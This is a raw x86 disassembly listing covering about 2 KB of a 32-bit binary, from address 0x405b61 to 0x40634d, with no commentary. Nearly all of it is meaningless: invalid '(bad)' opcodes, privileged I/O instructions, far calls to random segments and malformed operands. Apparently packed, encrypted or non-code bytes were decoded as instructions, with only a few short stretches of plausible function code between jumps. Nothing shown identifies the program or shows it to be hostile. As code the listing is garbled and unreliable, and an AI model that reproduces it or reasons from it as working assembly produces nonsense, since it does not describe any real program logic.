  405b61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b62:	dec    ebx
  405b63:	jae    0x405b4c
  405b65:	ror    BYTE PTR [ebx-0x49],cl
  405b68:	enterw 0x1ec1,0x47
  405b6d:	push   edx
  405b6e:	and    BYTE PTR [esi+0x1b],al
  405b71:	imul   esi,DWORD PTR [edx+0x4d696fcb],0xffffff94
  405b78:	sub    BYTE PTR [eax+0x43],0xd2
  405b7c:	add    al,0x2b
  405b7e:	xor    edi,DWORD PTR [edi+0x22]
  405b81:	xchg   ebp,eax
  405b82:	mov    cs,WORD PTR [esi+0x44]
  405b85:	add    dh,BYTE PTR [edx+0x458bad58]
  405b8b:	in     al,dx
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	call   0x7e29:0x60309c96
  405bb2:	jle    0x405c09
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405bad
  405bb8:	push   eax
  405bb9:	fdivr  QWORD PTR [ecx]
  405bbb:	outs   dx,DWORD PTR ds:[esi]
  405bbc:	and    BYTE PTR [eax+0x5f],0xf4
  405bc0:	icebp  
  405bc1:	sti    
  405bc2:	pop    ds
  405bc3:	mov    ds:0x53520c5f,al
  405bc8:	loope  0x405ba9
  405bca:	ja     0x405bf3
  405bcc:	xchg   esi,eax
  405bcd:	cmp    ch,BYTE PTR [edx]
  405bcf:	out    0x2e,eax
  405bd1:	lock iret 
  405bd3:	push   0xba584317
  405bd8:	add    DWORD PTR [eax+ecx*2-0x48d002f1],edx
  405bdf:	ins    BYTE PTR es:[edi],dx
  405be0:	mov    al,ds:0x5aa4fe0c
  405be5:	scas   al,BYTE PTR es:[edi]
  405be6:	mov    bl,BYTE PTR [esi-0x3]
  405be9:	cmp    BYTE PTR [edi-0x34],dh
  405bec:	dec    bx
  405bee:	dec    esp
  405bef:	xchg   ecx,eax
  405bf0:	mov    db5,edi
  405bf3:	dec    esp
  405bf4:	inc    ecx
  405bf5:	pop    edi
  405bf6:	jecxz  0x405bce
  405bf8:	xchg   DWORD PTR ds:0x336ab3a2,esp
  405bfe:	ret    
  405bff:	repnz sahf 
  405c01:	stc    
  405c02:	jmp    0x405bb2
  405c04:	aad    0xb4
  405c06:	cdq    
  405c07:	ret    0xb554
  405c0a:	mov    esi,0x2434ddc
  405c0f:	xor    ah,0x92
  405c12:	jle    0x405c8a
  405c14:	popf   
  405c15:	xlat   BYTE PTR ds:[ebx]
  405c16:	jmp    0x405c60
  405c18:	fild   WORD PTR [ecx]
  405c1a:	pushf  
  405c1b:	sbb    bh,cl
  405c1d:	out    dx,eax
  405c1e:	icebp  
  405c1f:	lahf   
  405c20:	mov    dh,0x8b
  405c22:	pop    ebp
  405c23:	sub    edx,DWORD PTR [ecx-0x2e]
  405c26:	shl    DWORD PTR [eax-0x412098ff],0xd4
  405c2d:	push   ss
  405c2e:	mov    ecx,0x3a1185b6
  405c33:	mov    ebx,0x935fd0fc
  405c38:	add    BYTE PTR [esi-0x2a],ah
  405c3b:	mov    dh,0x76
  405c3d:	cmp    al,0x5
  405c3f:	sbb    eax,0xe07de8be
  405c44:	adc    bl,BYTE PTR [eax]
  405c46:	loop   0x405c85
  405c48:	or     ch,bh
  405c4a:	scas   eax,DWORD PTR es:[edi]
  405c4b:	(bad)  
  405c4c:	sub    al,BYTE PTR ds:0x4555c9c3
  405c52:	cmovb  ebx,DWORD PTR ds:0x89242935
  405c59:	jp     0x405c30
  405c5b:	cmp    ebp,esi
  405c5d:	dec    esi
  405c5e:	push   ebp
  405c5f:	shl    ecx,1
  405c61:	test   edi,esp
  405c63:	push   ebx
  405c64:	idiv   esi
  405c66:	mov    dl,0xdc
  405c68:	rcr    BYTE PTR [ebp+0x2b7ae5d5],0xf3
  405c6f:	jmp    0x7269e016
  405c74:	popa   
  405c75:	dec    ecx
  405c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c77:	daa    
  405c78:	repz fldcw WORD PTR [eax]
  405c7b:	xchg   edx,eax
  405c7c:	cmp    al,0x22
  405c7e:	fwait
  405c7f:	ret    0x54ca
  405c82:	(bad)  
  405c84:	(bad)  [edi+0x64c504e4]
  405c8a:	dec    eax
  405c8b:	cmp    BYTE PTR [bp+di],bl
  405c8e:	and    BYTE PTR ds:0x4b102b6e,0x8f
  405c95:	pop    eax
  405c96:	iret   
  405c97:	mov    al,0xdb
  405c99:	sbb    eax,0xb447106c
  405c9e:	sbb    al,BYTE PTR [edx]
  405ca0:	stos   BYTE PTR es:[edi],al
  405ca1:	push   0xffffff80
  405ca3:	mov    eax,ds:0x52f59186
  405ca8:	push   ebx
  405ca9:	cmp    ch,BYTE PTR [ecx+0x5d]
  405cac:	xor    DWORD PTR [edi-0x80],ebp
  405caf:	push   0xffffffdf
  405cb1:	pop    gs
  405cb3:	mov    bh,0x26
  405cb5:	(bad)  
  405cb6:	sub    BYTE PTR [ecx+0x13bb434c],dl
  405cbc:	ins    BYTE PTR es:[edi],dx
  405cbd:	cmp    BYTE PTR [edi],ah
  405cbf:	popf   
  405cc0:	stos   DWORD PTR es:[edi],eax
  405cc1:	xor    edi,DWORD PTR ss:[ebp+eiz*8+0x19]
  405cc6:	dec    BYTE PTR [esi+0x183854e4]
  405ccc:	sar    BYTE PTR [ebp+0x27],1
  405ccf:	adc    ah,cl
  405cd1:	das    
  405cd2:	and    al,0xb
  405cd4:	stc    
  405cd5:	adc    dh,BYTE PTR [ebp-0x4dcdbfdc]
  405cdb:	mov    eax,0x23951866
  405ce0:	cs and eax,0x93e51448
  405ce6:	jo     0x405d5b
  405ce8:	fiadd  DWORD PTR [esi]
  405cea:	ret    
  405ceb:	retf   
  405cec:	inc    edx
  405ced:	outs   dx,BYTE PTR ds:[esi]
  405cee:	leave  
  405cef:	pop    edx
  405cf0:	inc    ebp
  405cf1:	jns    0x405d55
  405cf3:	jo     0x405d61
  405cf5:	(bad)  
  405cf6:	mov    edx,0x8d10d7e4
  405cfb:	stc    
  405cfc:	mov    ebx,0x31aeee44
  405d01:	xlat   BYTE PTR ds:[ebx]
  405d02:	dec    DWORD PTR [ebx+0x69]
  405d05:	dec    ecx
  405d06:	rep lods eax,DWORD PTR ds:[esi]
  405d08:	fucomi st,st(6)
  405d0a:	mov    DWORD PTR [ebp-0xd606299],esp
  405d10:	push   ds
  405d11:	sbb    esp,esp
  405d13:	or     esp,DWORD PTR [ecx+ebp*2]
  405d16:	fdiv   QWORD PTR [ecx]
  405d18:	rcl    DWORD PTR [bx+0x72],0x4f
  405d1d:	add    al,0x43
  405d1f:	sub    al,0xc0
  405d21:	inc    ebx
  405d22:	sbb    eax,0x575b09ed
  405d27:	daa    
  405d28:	cli    
  405d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d2a:	sar    DWORD PTR [ecx-0x7f],cl
  405d2d:	(bad)
  405d31:	fstp   DWORD PTR [edx-0xf]
  405d34:	xchg   esp,eax
  405d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d36:	in     eax,dx
  405d37:	adc    ebp,DWORD PTR [ebp+0x68]
  405d3a:	jno    0x405d5d
  405d3c:	and    BYTE PTR [eax],dl
  405d3e:	or     DWORD PTR [ecx-0xcb25870],eax
  405d44:	inc    esp
  405d45:	adc    ah,BYTE PTR [esi-0x75f37fd8]
  405d4b:	mov    dl,0x63
  405d4d:	ds out 0xd,eax
  405d50:	into   
  405d51:	stos   BYTE PTR es:[edi],al
  405d52:	fistp  DWORD PTR [ebx-0x64bedda1]
  405d58:	fst    st(0)
  405d5a:	or     al,0xd2
  405d5c:	mov    fs,WORD PTR [edx-0x68]
  405d5f:	or     al,0x32
  405d61:	jl     0x405dbc
  405d63:	retf   0x9cdc
  405d66:	push   eax
  405d67:	or     al,0xa2
  405d69:	mov    WORD PTR [ebp+ecx*4+0x5ee46fa0],gs
  405d70:	shr    DWORD PTR [edi-0x1368a9d0],1
  405d76:	mov    ds:0xb0dc0a4,eax
  405d7b:	xchg   esp,eax
  405d7c:	rcl    edx,0x58
  405d7f:	js     0x405d09
  405d81:	in     al,dx
  405d82:	sbb    BYTE PTR [eax],bl
  405d84:	push   ds
  405d85:	(bad)  
  405d86:	out    0x19,eax
  405d88:	jp     0x405d60
  405d8a:	sub    DWORD PTR [edx],0xffffffa3
  405d8d:	and    BYTE PTR [edx+ebx*4+0x30],dh
  405d91:	and    al,0x8b
  405d93:	inc    ebp
  405d94:	lock mov eax,DWORD PTR [eax+0x198]
  405d9b:	push   DWORD PTR [eax]
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0xc79c135b,al
  405dbe:	xchg   ecx,eax
  405dbf:	jnp    0x405dda
  405dc1:	inc    edi
  405dc2:	aaa    
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405d61
  405dca:	xchg   esi,eax
  405dcb:	push   ebp
  405dcc:	jl     0x405d82
  405dce:	jmp    0x405ddc
  405dd0:	cmp    cl,bl
  405dd2:	adc    eax,DWORD PTR [edi]
  405dd4:	mov    cl,0xb9
  405dd6:	sub    al,0x9f
  405dd8:	mov    dh,0x2a
  405dda:	push   0x45
  405ddc:	stc    
  405ddd:	jmp    0x405e48
  405ddf:	xor    eax,0xe13c8364
  405de4:	adc    eax,0xbb04a5eb
  405de9:	repz jp 0x405e64
  405dec:	scas   eax,DWORD PTR es:[edi]
  405ded:	adc    BYTE PTR [ecx],al
  405def:	mov    ds:0xc4754f9b,eax
  405df4:	(bad)  
  405df5:	dec    esp
  405df6:	jno    0x405e75
  405df8:	outs   dx,DWORD PTR ds:[esi]
  405df9:	xchg   BYTE PTR [esi+0x717498e3],bh
  405dff:	dec    esi
  405e00:	(bad)  
  405e01:	jecxz  0x405df7
  405e03:	mov    eax,0xa1c9815e
  405e08:	pop    edi
  405e09:	mov    esi,DWORD PTR [ecx+0x25]
  405e0c:	fmul   DWORD PTR [ebp-0x2c8d7f72]
  405e12:	mov    ebx,0x4fc76eef
  405e17:	mov    WORD PTR [eax+0x6d86841a],ds
  405e1d:	cmc    
  405e1e:	ror    BYTE PTR [edx],1
  405e20:	ret    0xc8b6
  405e23:	adc    DWORD PTR ds:0xea76bf,ebp
  405e29:	sar    DWORD PTR [edx],cl
  405e2b:	(bad)  
  405e2c:	ins    DWORD PTR es:[edi],dx
  405e2d:	mov    bh,0xaf
  405e2f:	not    BYTE PTR [ebp-0x3e]
  405e32:	mov    WORD PTR [ecx+0x59],gs
  405e35:	out    0x49,eax
  405e37:	mov    ah,BYTE PTR [esi]
  405e39:	dec    esp
  405e3a:	dec    esp
  405e3b:	jmp    0x405e96
  405e3d:	repz imul DWORD PTR [edi]
  405e40:	pop    esi
  405e41:	push   eax
  405e42:	ds push eax
  405e44:	and    BYTE PTR [eax],0x64
  405e47:	dec    edx
  405e48:	fbld   TBYTE PTR [ecx]
  405e4a:	fstp   TBYTE PTR [eax-0x185546f2]
  405e50:	std    
  405e51:	fs push edx
  405e53:	or     esi,DWORD PTR [ecx+eax*8]
  405e56:	cmp    ebp,DWORD PTR [ebx-0x50d78d3f]
  405e5c:	push   0xd0ba0042
  405e61:	mov    esp,0x13779b8d
  405e66:	pop    esp
  405e67:	retf   0xf3ea
  405e6a:	mov    ebx,0x26f0317c
  405e6f:	xor    DWORD PTR [esi+0x6d],ebp
  405e72:	je     0x405eb7
  405e74:	mov    bp,0x9f1e
  405e78:	test   BYTE PTR [ebx],ch
  405e7a:	jns    0x405ec3
  405e7c:	mov    es,WORD PTR [ebx]
  405e7e:	data16 lock jl 0x405e91
  405e82:	jb     0x405eba
  405e84:	fmul   DWORD PTR [eax+0x750c8269]
  405e8a:	fnstsw WORD PTR [ecx]
  405e8c:	int3   
  405e8d:	sub    eax,0xe871e633
  405e92:	mov    edi,0xb0488d97
  405e97:	pop    DWORD PTR [edx]
  405e99:	inc    edx
  405e9a:	mov    BYTE PTR [edi-0x17],al
  405e9d:	data16 sub ch,BYTE PTR [edi]
  405ea0:	push   cs
  405ea1:	xlat   BYTE PTR ds:[ebx]
  405ea2:	repnz pop ebx
  405ea4:	sbb    ecx,DWORD PTR [eax+0x17cec4db]
  405eaa:	dec    ebx
  405eab:	pop    esi
  405eac:	fstp   DWORD PTR [edi-0x388ae589]
  405eb2:	ins    BYTE PTR es:[edi],dx
  405eb3:	test   cl,bl
  405eb5:	dec    eax
  405eb6:	mov    ds:0xf61298ae,al
  405ebb:	jbe    0x405e5e
  405ebd:	push   0xffffffde
  405ebf:	pop    ds
  405ec0:	rcr    BYTE PTR [eax-0x14],0x27
  405ec4:	rcl    DWORD PTR [esi+0x5d982c9a],1
  405eca:	out    dx,al
  405ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ecc:	(bad)  
  405ecd:	mov    bh,0xfb
  405ecf:	or     eax,0x1afa41e
  405ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ed5:	dec    ebx
  405ed6:	xchg   esp,eax
  405ed7:	inc    edi
  405ed8:	retf   0xa35
  405edb:	jbe    0x405ec5
  405edd:	mov    cl,bh
  405edf:	hlt    
  405ee0:	aad    0x2c
  405ee2:	repnz and ebx,ecx
  405ee5:	pop    ecx
  405ee6:	jmp    DWORD PTR [eax-0x21]
  405ee9:	inc    ebx
  405eea:	pop    es
  405eeb:	add    al,0x2f
  405eed:	fcom   QWORD PTR [eax-0x23cda1bd]
  405ef3:	mov    bl,0xc7
  405ef5:	call   0xed04:0x46d24687
  405efc:	fmul   QWORD PTR [edi]
  405efe:	arpl   WORD PTR [ebx-0x19],sp
  405f01:	or     DWORD PTR [ecx],0x20ed5316
  405f07:	aam    0x45
  405f09:	mov    ebp,0x8a81783
  405f0e:	pop    eax
  405f0f:	xchg   esp,eax
  405f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f11:	stc    
  405f12:	iret   
  405f13:	lods   eax,DWORD PTR ds:[esi]
  405f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f15:	rcr    DWORD PTR [ebp+0x74c48187],cl
  405f1b:	mov    ebx,0xb188a2aa
  405f20:	pop    esi
  405f21:	mov    DWORD PTR [ecx-0x47],edi
  405f24:	ja     0x405f87
  405f26:	xor    BYTE PTR [ecx+0x9c307a0],0x21
  405f2d:	inc    ecx
  405f2e:	jmp    FWORD PTR [edx-0x7a0e6a9f]
  405f34:	push   0xaa7cc0ef
  405f39:	popf   
  405f3a:	sub    eax,0xb803583b
  405f3f:	sub    eax,0x6dd34619
  405f44:	jg     0x405f68
  405f46:	jg     0x405ef9
  405f48:	add    al,0xd5
  405f4a:	rcr    BYTE PTR [edi+0x10],1
  405f4d:	dec    edi
  405f4e:	shr    DWORD PTR [ebp+0x5f],1
  405f51:	mov    WORD PTR [ebp+0xfdb1ff],ss
  405f57:	outs   dx,DWORD PTR ss:[esi]
  405f59:	fist   DWORD PTR [edi+0x45d03744]
  405f5f:	test   eax,ebp
  405f61:	mov    ?,WORD PTR [esi]
  405f63:	std    
  405f64:	fbld   TBYTE PTR [eax-0x71]
  405f67:	ins    DWORD PTR es:[edi],dx
  405f68:	xchg   edx,eax
  405f69:	leave  
  405f6a:	call   0xd4dc6ee9
  405f6f:	add    bl,BYTE PTR [ebp+0x30]
  405f72:	cmc    
  405f73:	jp     0x405f73
  405f75:	mov    ds:0xdea9c82f,al
  405f7a:	aam    0xb6
  405f7c:	dec    edi
  405f7d:	nop
  405f7e:	clc    
  405f7f:	cmp    al,0xcb
  405f81:	sub    ah,ah
  405f83:	cdq    
  405f84:	mov    esp,0x4f220e4e
  405f89:	mov    ds:0x3fd124a6,al
  405f8e:	cmp    al,0x6c
  405f90:	mov    BYTE PTR [edi-0x62],bl
  405f93:	mov    edi,gs
  405f95:	jb     0x405ffe
  405f97:	js     0x405f51
  405f99:	sbb    edi,DWORD PTR [eax]
  405f9b:	cmp    DWORD PTR [ecx],edx
  405f9d:	jae    0x405f79
  405f9f:	mov    ecx,0xdd4d304f
  405fa4:	mov    DWORD PTR [ebp-0x20],eax
  405fa7:	je     0x406a43
  405fad:	jmp    0x4061a5
  405fb2:	jmp    0x405fa8
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x2c]
  405fbf:	and    DWORD PTR ds:0x7e359a2b,ebx
  405fc5:	jle    0x40601c
  405fc7:	jg     0x406047
  405fc9:	jle    0x406015
  405fcb:	xor    esp,ecx
  405fcd:	mov    cl,0xeb
  405fcf:	sub    al,BYTE PTR [ebx+0x34]
  405fd2:	jo     0x405f87
  405fd4:	jns    0x405ffc
  405fd6:	xchg   esi,eax
  405fd7:	lods   al,BYTE PTR ds:[esi]
  405fd8:	mov    ds:0xeebd5fe7,al
  405fdd:	mov    esp,0x77e9a3f6
  405fe2:	push   0x4b8117b5
  405fe7:	adc    dl,dh
  405fe9:	retf   0x5fa4
  405fec:	pop    ebx
  405fed:	loope  0x40605a
  405fef:	scas   eax,DWORD PTR es:[edi]
  405ff0:	enter  0x82a,0x8a
  405ff4:	jp     0x40600b
  405ff6:	icebp  
  405ff7:	gs popf 
  405ff9:	pop    esi
  405ffa:	xlat   BYTE PTR ds:[ebx]
  405ffb:	shr    BYTE PTR [esi-0x375e982d],cl
  406001:	ins    DWORD PTR es:[edi],dx
  406002:	jb     0x405fca
  406004:	mov    dl,0x2c
  406006:	push   0xf9db20ff
  40600b:	adc    al,0x8f
  40600d:	dec    edi
  40600e:	xor    esp,DWORD PTR [ebp+0x3660e852]
  406014:	add    DWORD PTR [edx+0x6c],edi
  406017:	xchg   edi,eax
  406018:	dec    ebp
  406019:	retf   0x315f
  40601c:	add    ah,ch
  40601e:	mov    esi,0x6beb2045
  406023:	cmp    ebx,eax
  406025:	cmp    DWORD PTR [ebp-0x32],0xffffff99
  406029:	in     al,0xf
  40602b:	fstp   DWORD PTR [ecx+0x7094587d]
  406031:	addr16 jo 0x405ff2
  406034:	arpl   WORD PTR [ecx],si
  406036:	mov    bl,0xd
  406038:	cmp    eax,0x5144cfd2
  40603d:	sub    eax,0x673c719c
  406042:	mov    cl,ah
  406044:	fistp  WORD PTR [edx]
  406046:	sub    al,0x27
  406048:	int3   
  406049:	xor    edi,DWORD PTR [ebx-0x65a5e8cd]
  40604f:	sahf   
  406050:	jnp    0x4060bb
  406052:	arpl   WORD PTR [ebx+0x3f3b7f78],cx
  406058:	int3   
  406059:	jae    0x4060aa
  40605b:	sbb    BYTE PTR [ecx+ebx*1],0x6c
  40605f:	out    dx,al
  406060:	and    cl,BYTE PTR [ebx+eax*2]
  406063:	add    bl,BYTE PTR [edi]
  406065:	aaa    
  406066:	bound  esi,QWORD PTR [esi-0x68]
  406069:	and    dh,0x12
  40606c:	add    BYTE PTR [ecx-0x42e9d99b],bh
  406072:	jo     0x406042
  406074:	adc    bl,dl
  406076:	and    al,0x9b
  406078:	xor    ebx,DWORD PTR [eax-0x40b46caf]
  40607e:	lock pushf 
  406080:	pusha  
  406081:	stos   BYTE PTR es:[edi],al
  406082:	or     al,BYTE PTR [ebp-0xb54dfdd]
  406088:	cwde   
  406089:	mov    bh,0xf1
  40608b:	adc    BYTE PTR [ecx],dh
  40608d:	bnd ret 0x1942
  406091:	xchg   ebx,eax
  406092:	xor    eax,0xca622a7e
  406097:	xor    ah,dh
  406099:	jmp    0x4060f4
  40609b:	leave  
  40609c:	jmp    0x40606a
  40609e:	rol    BYTE PTR [ecx],1
  4060a0:	call   0xdf449bab
  4060a5:	push   ebp
  4060a6:	jg     0x4060b1
  4060a8:	in     eax,dx
  4060a9:	(bad)  
  4060aa:	sahf   
  4060ab:	call   0xd9d9:0x45787118
  4060b2:	add    eax,0x8a481d32
  4060b7:	das    
  4060b8:	stos   DWORD PTR es:[edi],eax
  4060b9:	mov    dl,0x98
  4060bb:	jno    0x40605c
  4060bd:	xchg   esp,eax
  4060be:	sub    DWORD PTR [ebp+ebp*2-0x69],ecx
  4060c2:	loop   0x4060fc
  4060c4:	shr    bl,cl
  4060c6:	adc    eax,0xbfea8b08
  4060cb:	call   0x3aca:0xba988906
  4060d2:	repnz pop eax
  4060d4:	cld    
  4060d5:	gs cmc 
  4060d7:	sub    eax,0xa494c6c0
  4060dc:	lods   al,BYTE PTR ds:[esi]
  4060dd:	sbb    BYTE PTR cs:[ebp-0x6e22e085],bh
  4060e4:	mov    ch,0x5a
  4060e6:	or     eax,0xd2523dda
  4060eb:	sahf   
  4060ec:	fwait
  4060ed:	or     DWORD PTR [ebx+ebx*1-0x2e52caa9],esp
  4060f4:	mov    ch,0xc5
  4060f6:	jno    0x406103
  4060f8:	imul   esi,DWORD PTR [edi],0x7bd57aff
  4060fe:	xchg   esi,eax
  4060ff:	xchg   edi,edx
  406101:	popf   
  406102:	outs   dx,DWORD PTR ds:[esi]
  406103:	add    BYTE PTR [edi-0x13bb3eca],ah
  406109:	fild   QWORD PTR [ecx-0x4e]
  40610c:	mov    al,ds:0xdd464da3
  406111:	daa    
  406112:	push   eax
  406113:	cmp    al,0xe5
  406115:	dec    ecx
  406116:	and    DWORD PTR cs:[esi-0x17],esp
  40611a:	test   DWORD PTR [ebx-0x405967e0],esp
  406120:	addr16 jmp 0x40635771
  406126:	mov    ah,0x5a
  406128:	fldcw  WORD PTR [eax]
  40612a:	pop    esi
  40612b:	mov    dl,0xb
  40612d:	push   ds
  40612e:	mov    ebp,0xf56417fe
  406133:	add    al,0x72
  406135:	popf   
  406136:	in     al,0xce
  406138:	in     al,dx
  406139:	jns    0x406157
  40613b:	push   edx
  40613c:	xor    al,0x39
  40613e:	dec    edx
  40613f:	dec    eax
  406140:	mov    ebx,0x8abcaa2c
  406145:	add    BYTE PTR [eax-0x42],dl
  406148:	cmp    edi,0xffffffac
  40614b:	dec    ebx
  40614c:	push   ebx
  40614d:	jmp    0xe1e:0x801e3101
  406154:	dec    edi
  406155:	pushf  
  406156:	lock fcomp DWORD PTR es:[di-0x2a16]
  40615d:	push   esp
  40615e:	mov    esi,0x54b44e63
  406163:	stc    
  406164:	adc    eax,0xec26096c
  406169:	or     DWORD PTR [di],ebp
  40616c:	sub    BYTE PTR [esi-0x57],al
  40616f:	and    bh,BYTE PTR [ebx]
  406171:	ja     0x406134
  406173:	int3   
  406174:	pop    ecx
  406175:	mov    eax,0xa3a7cf59
  40617a:	inc    ebp
  40617b:	jne    0x40616c
  40617d:	(bad)  
  40617f:	push   eax
  406180:	mov    bh,0x3b
  406182:	sub    edi,DWORD PTR [eax+0x2d6f516]
  406188:	popa   
  406189:	mov    ?,esp
  40618b:	pop    ebp
  40618c:	jnp    0x40617e
  40618e:	add    eax,0xc3f60a78
  406193:	stc    
  406194:	int    0x67
  406196:	lock outs dx,BYTE PTR ds:[esi]
  406198:	inc    edx
  406199:	int3   
  40619a:	(bad)  
  40619b:	cmp    ecx,DWORD PTR [edi]
  40619d:	sbb    DWORD PTR [ebx+0x17f6b3c3],0x458d6f68
  4061a7:	call   0xd485ecfc
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	adc    ebx,DWORD PTR ds:0x33f1e605
  4061d7:	jle    0x406257
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x406191
  4061de:	pushf  
  4061df:	(bad)  
  4061e0:	sub    eax,0xf08585ac
  4061e5:	or     al,0x4e
  4061e7:	and    DWORD PTR [edx-0x1cf13292],eax
  4061ed:	mov    al,0xac
  4061ef:	cmp    al,0x3c
  4061f1:	(bad)  
  4061f2:	mov    ds:0x7fc4cef5,eax
  4061f7:	(bad)  
  4061f8:	js     0x40618d
  4061fa:	push   es
  4061fb:	in     al,dx
  4061fc:	push   ebp
  4061fd:	iret   
  4061fe:	shl    esi,0x83
  406201:	lods   al,BYTE PTR ds:[esi]
  406202:	retf   0x1b3d
  406205:	leave  
  406206:	stos   DWORD PTR es:[edi],eax
  406207:	dec    edi
  406208:	or     ch,BYTE PTR ds:0xaacabc3
  40620e:	(bad)  
  40620f:	lock jns 0x40622b
  406212:	xor    eax,0xd8bb3f06
  406217:	cli    
  406218:	and    al,0x65
  40621a:	dec    eax
  40621b:	add    DWORD PTR [ebx],ebp
  40621d:	ror    BYTE PTR [esi-0x7a],1
  406220:	jge    0x406230
  406222:	sub    BYTE PTR [edi+0xadb8a7a],ch
  406228:	jmp    0x35c3b94e
  40622d:	jge    0x40626e
  40622f:	inc    ebp
  406230:	imul   esi,DWORD PTR [edx],0xc1fa32b
  406236:	cmc    
  406237:	ss cmp ebx,ecx
  40623a:	pushf  
  40623b:	cmp    al,0xc1
  40623d:	in     eax,0xf5
  40623f:	inc    edi
  406240:	push   0x17
  406242:	data16 mov ah,0x5f
  406245:	cdq    
  406246:	mov    ?,WORD PTR [eax-0x80]
  406249:	inc    ecx
  40624a:	ret    0x7461
  40624d:	dec    eax
  40624e:	loop   0x406267
  406250:	aas    
  406251:	cmp    DWORD PTR [ecx-0x688eb3ea],ecx
  406257:	sar    BYTE PTR [ebx],0x66
  40625a:	fs adc al,0x32
  40625d:	xor    DWORD PTR [ecx],esp
  40625f:	or     eax,0xa77a2b8b
  406264:	mov    ah,0x8a
  406266:	arpl   cx,sp
  406268:	rol    BYTE PTR ds:0x77c5d645,1
  40626e:	out    0x8c,eax
  406270:	pop    esp
  406271:	icebp  
  406272:	out    dx,al
  406273:	jge    0x40629e
  406275:	ja     0x40622d
  406277:	mov    esp,0xca181e5d
  40627c:	push   cs
  40627d:	dec    edi
  40627e:	sub    ecx,DWORD PTR [esp+eiz*2+0x14]
  406282:	add    ah,BYTE PTR [ebx+0x33]
  406285:	sbb    ecx,ecx
  406287:	add    BYTE PTR [edx+eiz*8],ch
  40628a:	xor    esp,ecx
  40628c:	xchg   esi,eax
  40628d:	cmp    ebp,DWORD PTR [edx]
  40628f:	out    0x97,eax
  406291:	mov    esp,DWORD PTR ds:0x6ade7e2e
  406297:	clc    
  406298:	(bad)  
  406299:	jmp    0x40625c
  40629b:	js     0x406290
  40629d:	jmp    0xffbe:0xa321bab2
  4062a4:	or     DWORD PTR [ebx-0x4578e73a],esp
  4062aa:	dec    edx
  4062ab:	call   0xad24ef2c
  4062b0:	mov    ecx,0xa1c66018
  4062b5:	fdivr  QWORD PTR [ebp-0x2a5e83db]
  4062bb:	scas   eax,DWORD PTR es:[edi]
  4062bc:	shl    BYTE PTR [esi],0x82
  4062bf:	data16 scas al,BYTE PTR es:[edi]
  4062c1:	call   FWORD PTR [edx+0x5a]
  4062c4:	lds    edx,FWORD PTR [ebx+esi*2+0x6d]
  4062c8:	mov    ecx,0x14353ee9
  4062cd:	or     eax,0xf9b08ee
  4062d2:	jl     0x406300
  4062d4:	test   DWORD PTR [edi+edi*1+0x5d],ebp
  4062d8:	xchg   ch,al
  4062da:	jp     0x4062d0
  4062dc:	bound  edi,QWORD PTR [edi-0x74a5bc51]
  4062e2:	sbb    ebp,DWORD PTR [eax+ebp*8]
  4062e5:	jmp    0x40635e
  4062e7:	xlat   BYTE PTR ds:[ebx]
  4062e8:	mov    eax,ds:0x32db555c
  4062ed:	adc    BYTE PTR [ebx],dl
  4062ef:	icebp  
  4062f0:	mov    bh,0xd
  4062f2:	rcr    BYTE PTR [ebx-0x6a9f287b],cl
  4062f8:	xor    BYTE PTR [ebx-0x76a5b69],0x64
  4062ff:	(bad)  
  406300:	rol    BYTE PTR [ebx+0xd2305a0],1
  406306:	cmp    esp,0x67277ad7
  40630c:	enter  0xa9ae,0x18
  406310:	cmp    al,0x80
  406312:	outs   dx,DWORD PTR ds:[esi]
  406313:	stc    
  406314:	daa    
  406315:	(bad)  
  406316:	das    
  406317:	jno    0x406358
  406319:	js     0x40629b
  40631b:	test   BYTE PTR [esi-0x8],bl
  40631e:	pop    ss
  40631f:	cmp    cl,al
  406321:	ret    
  406322:	add    eax,0xdb663774
  406327:	addr16 mov ds:0xc409,al
  40632b:	or     ch,bl
  40632d:	mov    esi,0xef4df8a1
  406332:	es xchg esp,eax
  406334:	daa    
  406335:	pop    edx
  406336:	mov    ecx,0x61e19d45
  40633b:	inc    ebx
  40633c:	jl     0x40631c
  40633e:	fs (bad) 
  406340:	iret   
  406341:	cli    
  406342:	aas    
  406343:	xchg   ecx,eax
  406344:	sbb    al,0xc4
  406346:	cmp    al,ch
  406348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406349:	pusha  
  40634a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40634b:	cmc    
  40634c:	push   esi
  40634d:	adc    al,bh
